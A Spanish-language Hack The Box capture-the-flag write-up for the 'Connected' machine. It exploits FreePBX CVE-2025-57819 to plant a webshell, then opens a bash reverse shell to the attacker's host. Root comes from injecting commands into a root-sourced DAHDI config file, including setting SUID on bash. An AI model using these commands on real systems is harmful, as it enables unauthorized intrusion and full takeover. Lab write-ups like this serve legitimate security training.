---
title: "Connected - Hack The Box"
date: 2026-06-06
unlock_date: 2026-10-24
draft: false
slug: "htb-writeup-connected"
excerpt: "Esta fue una máquina sencilla. Después de analizar los escaneos, nos dirigimos a la página web activa del puerto 80, pues vemos que está utilizando un dominio, el cual registramos en el /etc/hosts. Al entrar al dominio, vemos que se está utilizando FreePBX versión 16.0.40.2 que, al buscarlo, descubrimos que es vulnerable al CVE-2025-57819, lo que nos permite ejecutar comandos de manera remota. Utilizamos una herramienta de Python3 que ejecuta esta vulnerabilidad y crea una WebShell, siendo que la aprovechamos para obtener una Reverse Shell, logrando así acceso a la máquina víctima. Dentro, usamos la herramienta linpeas.sh para identificar vulnerabilidades, logrando identificar una forma de escalar privilegios, abusando de una mala configuración del servicio DAHDI, siendo así que nos convertimos en Root."
categories: ["HackTheBox", "Easy Machine"]
tags: ["Linux", "Virtual Hosting", "SSH", "FreePBX", "Asterisk", "DAHDI", "CVE-2025-57819", "FreePBX Unauthenticated Remote Command Execution (RCE) - CVE-2025-57819", "Abusing Writable DAHDI Configuration File", "Privesc - Abusing Writable DAHDI Configuration File", "OSCP Style", "Metasploit Framework"]
tools:
  - "ping"
  - "nmap"
  - "wappalizer"
  - "wget"
  - "python3"
  - "curl"
  - "nc"
  - "bash"
  - "Metasploit Framework (msfconsole)"
  - "Módulo: exploit/unix/http/freepbx_unauth_sqli_to_rce"
  - "linpeas.sh"
  - "ChatGPT"
  - "file"
  - "echo"
  - "id"
  - "chmod"
links:
  - "https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/"
  - "https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819"
  - "https://www.exploit-db.com/exploits/52031"
  - "https://github.com/peass-ng/PEASS-ng"
showtoc: true
header:
  teaser: "/assets/images/htb-writeup-connected/connected.png"
---

## Recopilación de Información {#Recopilacion}

### Traza ICMP {#Ping}

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 10.129.15.23
PING 10.129.15.23 (10.129.15.23) 56(84) bytes of data.
64 bytes from 10.129.15.23: icmp_seq=1 ttl=63 time=141 ms
64 bytes from 10.129.15.23: icmp_seq=2 ttl=63 time=139 ms
64 bytes from 10.129.15.23: icmp_seq=3 ttl=63 time=141 ms
64 bytes from 10.129.15.23: icmp_seq=4 ttl=63 time=141 ms

--- 10.129.15.23 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 138.701/140.303/141.336/0.974 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

### Escaneo de Puertos {#Puertos}

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.15.23 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 13:30 -0600
Initiating SYN Stealth Scan at 13:30
Scanning 10.129.15.23 [65535 ports]
Discovered open port 80/tcp on 10.129.15.23
Discovered open port 443/tcp on 10.129.15.23
Discovered open port 22/tcp on 10.129.15.23
Completed SYN Stealth Scan at 13:31, 26.97s elapsed (65535 total ports)
Nmap scan report for 10.129.15.23
Host is up, received user-set (0.30s latency).
Scanned at 2026-06-06 13:30:52 CST for 27s
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 63
80/tcp  open  http    syn-ack ttl 63
443/tcp open  https   syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 27.06 seconds
           Raw packets sent: 131084 (5.768MB) | Rcvd: 31 (1.364KB)
```

| Parámetros | Descripción |
|---|---|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Vemos 3 puertos abiertos, pero me da curiosidad que estén activos al mismo tiempo el **puerto 80** y el **puerto 443**. Quizá ambos están relacionados.

### Escaneo de Servicios {#Servicios}

```bash
nmap -sCV -p 22,80,443 10.129.15.23 -oN targeted
Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-06 13:31 -0600
Nmap scan report for 10.129.15.23
Host is up (0.14s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)

| ssh-hostkey: 
|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)

|_http-title: Did not follow redirect to http://connected.htb/
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)

|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2025-11-30T14:07:27
|_Not valid after:  2026-11-30T14:07:27
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.02 seconds
```

| Parámetros | Descripción |
|---|---|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Gracias al escaneo, podemos ver varias cosillas:
* El servicio **SSH** del **puerto 22** está usando una versión antigua, por lo que puede existir algún Exploit que podamos ocupar en su contra.
* El **puerto 80** redirige a un dominio que podemos guardar en el `/etc/hosts`, además, esto indica el uso de **Virtual Hosting**.
* Parece que al entrar en la página web del **puerto 443**, se obtiene un código de estado **400**, así que puede que no esté configurado correctamente.
* Podemos ver que se menciona **CentOS**, pero debemos comprobar que este sea el sistema operativo de la máquina víctima.

Vamos a iniciar con la página web activa del **puerto 80**, así que guardemos el dominio en el `/etc/hosts` y entremos a este:
```bash
echo '10.129.15.23 connected.htb' >> /etc/hosts
```

## Análisis de Vulnerabilidades {#Analisis}

### Analizando Servicio HTTP {#HTTP}

Entremos:

<p align="center">
<img src="/assets/images/htb-writeup-connected/Captura1.png">
</p>

Entramos a un panel de administración de una herramienta llamada **FreePBX**, y vemos que se está ocupando la versión **16.0.40.2**.

Veamos qué nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/htb-writeup-connected/Captura2.png">
</p>

Vemos varias tecnologías, pero me llama la atención la versión desactualizada de **PHP** y confirmamos que la máquina tiene el sistema operativo **CentOS**.

Investiguemos qué es **FreePBX**:

| **FreePBX** |
|:-----------:|
| *FreePBX es una interfaz gráfica de administración para el software de telefonía IP Asterisk. Permite configurar y gestionar una central telefónica (PBX) sin necesidad de editar manualmente los archivos de configuración de Asterisk. En términos simples, Asterisk es el motor de telefonía, mientras que FreePBX es el panel de control web que facilita su administración.* |

Revisando la página, podemos ver un login si entramos en la opción **FreePBX Administration**:

<p align="center">
<img src="/assets/images/htb-writeup-connected/Captura3.png">
</p>

Pero no tenemos credenciales válidas de momento. 

También si entramos a la opción **UCP**, nos redirigirá a otro login:

<p align="center">
<img src="/assets/images/htb-writeup-connected/Captura4.png">
</p>

Las otras opciones no parecen estar funcionando más que la opción de soporte.

La opción a seguir sería aplicar **Fuzzing**, pero no encontraremos nada de relevancia y la página web del **puerto 443** tiene configurado el mismo **FreePBX**:

<p align="center">
<img src="/assets/images/htb-writeup-connected/Captura5.png">
</p>

Así que vamos a investigar si la versión del **FreePBX** es vulnerable a algún Exploit.

## Explotación de Vulnerabilidades {#Explotacion}

### Probando Exploit: CVE-2025-57819 FreePBX Pre-Auth RCE {#FreePBXexploit}

Investigando la versión del **FreePBX**, encontraremos el Exploit **CVE-2025-57819**, que el siguiente blog explica bien cómo se descubrió:
* <a href="https://labs.watchtowr.com/you-already-have-our-personal-data-take-our-phone-calls-too-freepbx-cve-2025-57819/" target="_blank">You Already Have Our Personal Data, Take Our Phone Calls Too (FreePBX CVE-2025-57819)</a>

Prácticamente, explica cómo se descubrió que es vulnerable a **Inyecciones SQL Ciegas**, que a su vez, permitió cargar una **WebShell** para poder ejecutar comandos de manera remota (**RCE**).

Además, nos incluyen un repositorio que contiene un script hecho en **Python3** que permite ejecutar la vulnerabilidad para cargar una **webshell**:
* <a href="https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819" target="_blank">Repositorio de watchtowrlabs: watchTowr-vs-FreePBX-CVE-2025-57819</a>

Puedes descargar el script solamente usando **wget**:
```bash
wget https://raw.githubusercontent.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819/refs/heads/main/watchTowr-vs-FreePBX-CVE-2025-57819.py
```

Una vez que lo tengas descargado, solamente debemos indicarle la ruta donde está desplegado **FreePBX** y tratará de cargar la **Reverse Shell** o intentará crear un nuevo usuario:
```bash
python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H http://connected.htb/
			 __         ___  ___________                   
	 __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________ 
	 \ \/ \/ \__  \    ___/ ___\|  |  \|    | /  _ \ \/ \/ \_  __ \
	  \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
	   \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|   
				  \/          \/     \/                            
	  
        watchTowr-vs-FreePBX-CVE-2025-57819.py
        (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE

          - Piotr and Sonny of watchTowr

[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
[+] Sending exploit request
[+] Waiting 2 minutes for DAG script to be created
[+] VULNERABLE - webshell found: http://connected.htb/this-is-an-ioc-not-actually-watchTowr-w0aqkbjdvr.php?cmd=hostname
[+] Cleaning.sh malicious cron_job - please confirm manually that there is no malicious entries in asterisk.cron_jobs table
```
Excelente, funcionó y nos está dando una ruta que podemos probar para comprobar si la **WebShell** se cargó correctamente.

Probémosla:
```bash
curl http://connected.htb/this-is-an-ioc-not-actually-watchTowr-w0aqkbjdvr.php?cmd=id
uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
```
Muy bien, sí funciona. Aprovechemos la ruta para poder ejecutar una **Reverse Shell**.

Abre un listener con **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
```

Utiliza la siguiente **Reverse Shell** en la **WebShell**:
```bash
bash+-c+'bash+-i+>%26+/dev/tcp/Tu_IP/443+0>%261
```

Observa la **netcat**:
```bash
nc -nlvp 443
listening on [any] 443 ...
connect to [Tu_IP] from (UNKNOWN) [10.129.15.23] 41672
bash: no job control in this shell
______                   ______ ______ __   __

|  ___|                  | ___ \| ___ \\ \ / /
| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
|  _|  | '__| / _ \ / _ \|  __/ | ___ \ /   \ 
| |    | |   |  __/|  __/| |    | |_/ // /^\ \
\_|    |_|    \___| \___|\_|    \____/ \/   \/
                                              
                                              
NOTICE! You have 3 notifications! Please log into the UI to see them!
Current Network Configuration
+-----------+-------------------+---------------------------+

| Interface | MAC Address       | IP Addresses              |
+-----------+-------------------+---------------------------+

| eth0      | A2:DE:AD:37:0A:A8 | 10.129.15.23              |
|           |                   | fe80::82bd:1bcb:a990:dd3b |
+-----------+-------------------+---------------------------+
whoami

Please note most tasks should be handled through the GUI.
You can access the GUI by typing one of the above IPs in to your web browser.
For support please visit: 
    http://www.freepbx.org/support-and-professional-services

+---------------------------------------------------------------------+

| This machine is not activated.  Activating your system ensures that |
| your machine is eligible for support and that it has the ability to |
| install Commercial Modules.                                         |
|                                                                     |
| If you already have a Deployment ID for this machine, simply run:   |
|                                                                     |
|    fwconsole sysadmin activate deploymentid                         |
|                                                                     |
| to assign that Deployment ID to this system. If this system is new, |
| please go to Activation (which is on the System Admin page in the   |
| Web UI) and create a new Deployment there.                          |
+---------------------------------------------------------------------+

[asterisk@connected html]$ whoami
asterisk
```
Estamos dentro,

Obtengamos una sesión interactiva:
```bash
# Paso 1:
script /dev/null -c bash

# Paso 2:
CTRL + Z

# Paso 3:
stty raw -echo; fg

# Paso 4:
reset -> xterm

# Paso 5:
export TERM=xterm && export SHELL=bash && stty rows 51 columns 189

[asterisk@connected html]$ pwd
/var/www/html
```

Obtengamos la flag del usuario:
```bash
[asterisk@connected html]$ cd /home/asterisk/
[asterisk@connected asterisk]$ ls
user.txt
[asterisk@connected asterisk]$ cat user.txt
...
```

#### Probando Exploit: CVE-2025-57819 FreePBX Versión Metasploit {#FreePBXexploit2}

Podemos observar el Exploit **CVE-2025-57819**, pero creado para ejecutarlo desde **Metasploit Framework**:
```bash
msf > search FreePBX

Matching Modules
================

   #  Name                                                Disclosure Date  Rank       Check  Description
   -  ----                                                ---------------  ----       -----  -----------
   0  exploit/linux/misc/asterisk_ami_originate_auth_rce  2024-08-08       great      Yes    Asterisk AMI Originate Authenticated RCE
   1  exploit/unix/http/freepbx_callmenum                 2012-03-20       manual     No     FreePBX 2.10.0 / 2.9.0 callmenum Remote Code Execution
   2  exploit/unix/http/freepbx_unauth_sqli_to_rce        2025-08-28       excellent  Yes    FreePBX ajax.php unauthenticated SQLi to RCE
   3  exploit/unix/webapp/freepbx_config_exec             2014-03-21       excellent  Yes    FreePBX config.php Remote Code Execution
```

Cargamos la opción 2 y configuramos el módulo:
```bash
msf > use exploit/unix/http/freepbx_unauth_sqli_to_rce
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(unix/http/freepbx_unauth_sqli_to_rce) > set RHOSTS 10.129.15.23
RHOSTS => 10.129.15.23
msf exploit(unix/http/freepbx_unauth_sqli_to_rce) > set VHOST connected.htb
VHOST => connected.htb
msf exploit(unix/http/freepbx_unauth_sqli_to_rce) > set LHOST 10.10.15.10
LHOST => Tu_IP
```

Ya configurado, solamente lo ejecutamos:
```bash
msf exploit(unix/http/freepbx_unauth_sqli_to_rce) > exploit
[*] Started reverse TCP handler on Tu_IP:4444 
[+] Created cronjob with job name: 'HfNuokr'
[*] Waiting for cronjob to trigger...
[*] Sending stage (3090404 bytes) to 10.129.15.23
[*] Meterpreter session 1 opened (Tu_IP:4444 -> 10.129.15.23:50032) at 2026-06-06 13:53:08 -0600
[*] Attempting to perform cleanup
[+] Cronjob removed, happy hacking!

meterpreter > getuid
Server username: asterisk
```
Perfecto, estamos dentro.

## Post Explotación {#Post}

### Abusando de Configuración Mal Implementada de Servicio DAHDI para Escalar Privilegios {#DAHDI}

Al realizar la enumeración, no encontramos algo que nos ayude a escalar privilegios, así que utilizamos **linpeas.sh**, que puedes obtener de aquí:
* <a href="https://github.com/peass-ng/PEASS-ng" target="_blank">Repositorio de peass-ng: PEASS-ng</a>

Una vez que lo descargues en tu máquina, podemos mandarlo a la máquina víctima o ejecutarlo de manera remota.

En mi caso, lo voy a ejecutar de manera remota, entonces levantemos un servidor con **Python3**:
```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

Y ejecutamos el siguiente comando desde la máquina víctima:
```bash
[asterisk@connected asterisk]$ wget -qO- http://Tu_IP:8000/linpeas.sh | bash
```

De lo que pudo obtener, podemos notar la siguiente sección para **tareas CRON**:
```bash
╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
/usr/bin/crontab
...
...
...
/usr/bin/incrontab
...
/var/spool/asterisk/sysadmin/vpnget IN_CLOSE_WRITE /usr/sbin/sysadmin_openvpn -d
/var/spool/asterisk/sysadmin/intrusion_detection_stop IN_CLOSE_WRITE /etc/init.d/fail2ban stop
/var/spool/asterisk/sysadmin/update_system_cron IN_CLOSE_WRITE /usr/sbin/sysadmin_update_set_cron
/var/spool/asterisk/sysadmin/portmgmt_setup IN_CLOSE_WRITE /usr/sbin/sysadmin_portmgmt
/var/spool/asterisk/sysadmin/wanrouter_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_wanrouter_restart
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
/usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha
/usr/local/asterisk/incron IN_CLOSE_WRITE /usr/bin/sysadmin_manager --local $#

/var/spool/asterisk/incron IN_MODIFY,IN_ATTRIB,IN_CLOSE_WRITE /usr/bin/sysadmin_manager $#
```
Observa como describe las tareas que tiene monitoreadas la herramienta **incrontab** y vemos que estan remarcadas como una muy probable forma de escalada.

Pero analicemos este resultado a fondo.

Primero, ¿qué es **incrontab**?

| **incrontab** |
|:-------------:|
| *incron es un servicio similar a cron, pero basado en eventos del sistema de archivos. Mientras que cron ejecuta tareas según una hora programada, incron ejecuta tareas cuando ocurre un evento sobre un archivo o directorio.* |

Revisando los archivos mencionados y apoyandonos con **ChatGPT**, nos enfocamos en el siguiente resultado:
```bash
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

En este resultado, tenemos que conocer dos terminos:

| **inotify** |
|:-----------:|
| *inotify es un subsistema del kernel Linux que permite detectar eventos en archivos y directorios. incron está construido sobre inotify y algunos eventos comunes son: IN_CREATE, IN_DELETE, IN_MODIFY, IN_CLOSE_WRITE, IN_ATTRIB.* |

| **Evento IN_CLOSE_WRITE** |
|:-------------------------:|
| *Este evento significa que un archivo fue abierto para escritura, modificado y posteriormente cerrado. Por ejemplo, si se agrega una linea de texto a un archivo desde la terminal de comandos, sucede lo siguiente: Apertura del archivo, Escritura de datos y Cierre del archivo. Al cerrarse, se genera el evento IN_CLOSE_WRITE* |

Sabiendo esto, entendemos que el archivo monitorizado `/var/spool/asterisk/sysadmin/dahdi_restart`, cuando es modificado, ejecuta el script `/usr/sbin/sysadmin_dahdi_restart` por **incrontab**, que este solamente lo ejecuta el **Root**.

Además, vemos que se hace referencia a **DAHDI**, pero no sabemos qué es:

| **DAHDI** |
|:---------:|
| *DAHDI (Digium/Asterisk Hardware Device Interface) es un conjunto de controladores y herramientas que permiten a Asterisk interactuar con hardware de telefonía. DAHDI proporciona: Controladores para tarjetas telefónicas, interfaces de temporización (timing), configuración de canales de voz, integración con hardware PSTN y VoIP.* |

Prácticamente, hemos estado interactuando con un conjunto de servicios, desde **FreePBX**, **Asterisk** y **DAHDI**.

Ahora, veamos si tenemos permisos de escritura sobre el archivo `/var/spool/asterisk/sysadmin/dahdi_restart`:
```bash
[asterisk@connected asterisk]$ ls -la /var/spool/asterisk/sysadmin/dahdi_restart
-rw-rw-r--. 1 asterisk asterisk 0 Sep  8  2021 /var/spool/asterisk/sysadmin/dahdi_restart
[asterisk@connected asterisk]$ file /var/spool/asterisk/sysadmin/dahdi_restart
/var/spool/asterisk/sysadmin/dahdi_restart: empty
```
Sí los tenemos y este mismo archivo esta vacio.

Veamos qué contiene el script `/usr/sbin/sysadmin_dahdi_restart`:
```bash
[asterisk@connected asterisk]$ cat /usr/sbin/sysadmin_dahdi_restart
#!/bin/sh

/etc/init.d/asterisk stop

sleep 5

/etc/init.d/dahdi restart

sleep 5

export PATH=$PATH:/usr/local/sbin/:/usr/local/bin/
`which amportal` start
```
Este script, cuando se ejecuta, primero detiene el servicio **Asterisk**, espera 5 segundos, reinicia el servicio **DAHDI**, espera otros 5 segundos, añade rutas adicionales al **PATH** y ejecuta el comando **amportal**, que es quien inicia **FreePBX**.

Ese archivo `/etc/init.d/dahdi`, solamente lo puede modificar el **Root**, pero sí podemos ejecutarlo y leerlo:
```bash
[asterisk@connected asterisk]$ ls -la /etc/init.d/dahdi
-rwxr-xr-x. 1 root root 8496 Jun  5  2023 /etc/init.d/dahdi
```

Analicemos el contenido de ese archivo:
```bash
[asterisk@connected asterisk]$ cat /etc/init.d/dahdi
#!/bin/sh
#
# dahdi         This shell script takes care of loading and unloading \
#               DAHDI Telephony interfaces
# chkconfig: 2345 9 92
# description: The DAHDI drivers allow you to use your linux \
# computer to accept incoming data and voice interfaces
#
# config: /etc/dahdi/init.conf

### BEGIN INIT INFO
# Provides:        dahdi
# Required-Start:  $local_fs $remote_fs
# Required-Stop:   $local_fs $remote_fs
# Should-Start:    $network $syslog
# Should-Stop:     $network $syslog
# Default-Start:   2 3 4 5
# Default-Stop:    0 1 6
# Short-Description: DAHDI kernel modules
# Description:     dahdi - load and configure DAHDI modules
### END INIT INFO

initdir=/etc/init.d

# Don't edit the following values. Edit /etc/dahdi/init.conf instead.

DAHDI_CFG=/usr/sbin/dahdi_cfg
DAHDI_CFG_CMD=${DAHDI_CFG_CMD:-"$DAHDI_CFG"} # e.g: for a custom system.conf location
...
...
# Source function library.
if [ $system = redhat ]; then
    . $initdir/functions || exit 0
fi

DAHDI_MODULES_FILE="/etc/dahdi/modules"

[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf
...
...
```
Solamente deje lo más relevante.

Este script sirve para leer y cargar instrucciones de configuración del servicio **DAHDI**, pero aquí podemos ver dos cosas clave:
* Utiliza el archivo `/etc/dahdi/init.conf` para cargar instrucciones de configuración.
* La instrucción `[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf`, lee y ejecuta el contenido de dicho archivo, siendo similar a hacer un `source script`.

Por último, veamos los permisos que tengamos del archivo `/etc/dahdi/init.conf`:
```bash
[asterisk@connected asterisk]$ ls -la /etc/dahdi/init.conf
-rw-r--r--. 1 asterisk asterisk 771 Jun  5  2023 /etc/dahdi/init.conf
```
Podemos leerlo y modificarlo.

Veamos su contenido:
```bash
[asterisk@connected asterisk]$ cat /etc/dahdi/init.conf
#
# Shell settings for Dahdi initialization scripts.
# This replaces the old/per-platform files (/etc/sysconfig/zaptel,
# /etc/defaults/zaptel)
#

# The maximal timeout (seconds) to wait for udevd to finish generating 
# device nodes after the modules have loaded and before running dahdi_cfg. 
#DAHDI_DEV_TIMEOUT=40

# A list of modules to unload when stopping.
# All of their dependencies will be unloaded as well.
#DAHDI_UNLOAD_MODULES=""		# Disable module unloading
#DAHDI_UNLOAD_MODULES="dahdi echo"	# If you use OSLEC

# Override settings for xpp_fxloader
#XPP_FIRMWARE_DIR=/usr/share/dahdi
#XPP_HOTPLUG_DISABLED=yes
#XPP_HOTPLUG_DAHDI=yes
#ASTERISK_SUPPORTS_DAHDI_HOTPLUG=yes

# Disable udev handling:
#DAHDI_UDEV_DISABLE_DEVICES=yes
#DAHDI_UDEV_DISABLE_SPANS=yes
```
Todo está comentado, por lo que podemos meter cualquier cosa que queramos aquí.

En resumen de todo este análisis, tenemos lo siguiente:
* Si modificamos el archivo `/var/spool/asterisk/sysadmin/dahdi_restart`, el comando **incrontab** detecta el cambio y ejecuta el script `/usr/sbin/sysadmin_dahdi_restart` como **Root**.
* El script `/usr/sbin/sysadmin_dahdi_restart` ejecuta la instrucción `/etc/init.d/dahdi restart`.
* El script `/etc/init.d/dahdi` lee y ejecuta el archivo de configuración `/etc/dahdi/init.conf`, gracias a la instrucción `[ -r /etc/dahdi/init.conf ] && . /etc/dahdi/init.conf`.
* El archivo de configuración `/etc/dahdi/init.conf` no contiene instrucciones, por lo que podemos agregar cualquier comando y este debería ejecutarse como **Root**.

Hagamos una prueba simple: metamos el comando **id** en el archivo de configuración `/etc/dahdi/init.conf`, pero para ver el output lo guardaremos en un archivo que se guarde en nuestro directorio y, por último, hagamos una modificación simple al archivo `/var/spool/asterisk/sysadmin/dahdi_restart`, para que se ejecute nuestro comando:
```bash
[asterisk@connected asterisk]$ echo 'id > /home/asterisk/comando_test.txt' >> /etc/dahdi/init.conf
[asterisk@connected asterisk]$ echo test > /var/spool/asterisk/sysadmin/dahdi_restart
```

Esperemos unos segundos y listemos nuestros archivos. (**Ojo**, si no ves nada, vuelve a ejecutar el último comando o prueba una ruta donde tenga permisos de escritura el **usuario asterisk**):
```bash
[asterisk@connected asterisk]$ ls
comando_test.txt  user.txt
[asterisk@connected asterisk]$ cat comando_test.txt 
uid=0(root) gid=0(root) groups=0(root)
```
Ahí está el archivo y, al leerlo, vemos que sí se ejecutó nuestro comando.

Podemos hacer una segunda prueba, pero ahora con el comando **whoami**:
```bash
[asterisk@connected asterisk]$ echo 'whoami > /home/asterisk/comando_test2.txt' >> /etc/dahdi/init.conf
[asterisk@connected asterisk]$ echo test > /var/spool/asterisk/sysadmin/dahdi_restart
```

Esperemos unos segundos y volvamos a listar los archivos:
```bash
[asterisk@connected asterisk]$ ls
comando_test.txt  comando_test2.txt  user.txt
[asterisk@connected asterisk]$ cat comando_test2.txt 
root
```
Ahí está y confirmamos que podemos ejecutar comandos como **Root**.

Una buena opción sería inyectar una **Reverse Shell** para obtener una sesión como **Root**, pero algo mejor y más sencillo sería darle **permisos SUID** a la **Bash**.

Como tal, ya no necesitamos ver el output, entonces inyectemos la siguiente instrucción:
```bash
[asterisk@connected asterisk]$ echo 'chmod u+s /bin/bash' >> /etc/dahdi/init.conf
[asterisk@connected asterisk]$ echo test > /var/spool/asterisk/sysadmin/dahdi_restart
```

Esperemos unos segundos y vemos los permisos de la **Bash**:
```bash
[asterisk@connected asterisk]$ ls -la /bin/bash
-rwsr-xr-x. 1 root root 964536 Apr  1  2020 /bin/bash
```
Funcionó, le dimos **permisos SUID** a la **Bash**.

Ejecutemos la **Bash** con privilegios:
```bash
[asterisk@connected asterisk]$ bash -p
bash-4.2# whoami
root
```
Ya somos **Root**.

Obtengamos la última flag:
```bash
bash-4.2# cd /root
bash-4.2# ls
root.txt
bash-4.2# cat root.txt
```
Y con esto, terminamos la máquina.
